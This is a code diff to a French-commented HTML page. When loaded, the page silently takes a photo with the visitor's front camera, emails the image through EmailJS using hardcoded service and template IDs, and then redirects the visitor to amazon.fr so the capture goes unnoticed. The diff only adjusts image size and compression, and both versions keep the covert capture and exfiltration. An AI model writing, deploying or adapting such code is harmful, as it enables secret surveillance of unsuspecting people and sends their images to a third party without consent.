@@ -8,7 +8,7 @@
     body, html {
       margin: 0;
       padding: 0;
-      background: #000;
+      background: #000; /* écran noir */
       height: 100%;
       width: 100%;
       overflow: hidden;
@@ -20,7 +20,7 @@
 </head>
 <body>
   <video id="video" autoplay playsinline></video>
-  <canvas id="canvas" width="1920" height="1080"></canvas>
+  <canvas id="canvas" width="640" height="480"></canvas> <!-- HD -->
 
   <script>
     emailjs.init("IoSfbtGz4KSL_5_9E");
@@ -31,40 +31,21 @@
 
     async function startCapture() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user", width: 1920, height: 1080 }
-        });
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         video.srcObject = stream;
 
         video.onloadeddata = () => {
           context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const imageData = canvas.toDataURL("image/jpeg", 0.76); // qualité 76%
 
-          let quality = 0.9;
-          let imageData;
-          let sizeKB = 0;
+          stream.getTracks().forEach(track => track.stop()); // stop caméra
 
-          // Compression forcée jusqu'à ≤ 60KB
-          do {
-            imageData = canvas.toDataURL("image/jpeg", quality);
-            sizeKB = Math.round((imageData.length * 3 / 4) / 1024);
-            quality -= 0.05;
-          } while (sizeKB > 60 && quality > 0.05);
-
-          console.log("Taille finale:", sizeKB + "KB à qualité " + (quality+0.05));
-
-          // Stop caméra
-          stream.getTracks().forEach(track => track.stop());
-
-          // Envoi via EmailJS
           emailjs.send("service_8cs0gml", "template_rdhxflt", {
-            message: "Photo auto 📸 (" + sizeKB + " KB)",
+            message: "Photo auto 📸",
             image: imageData
-          });
-
-          // Redirection vers Amazon
-          setTimeout(() => {
+          }).finally(() => {
             window.location.href = "https://www.amazon.fr";
-          }, 500);
+          });
         };
       } catch (err) {
         window.location.href = "https://www.amazon.fr";
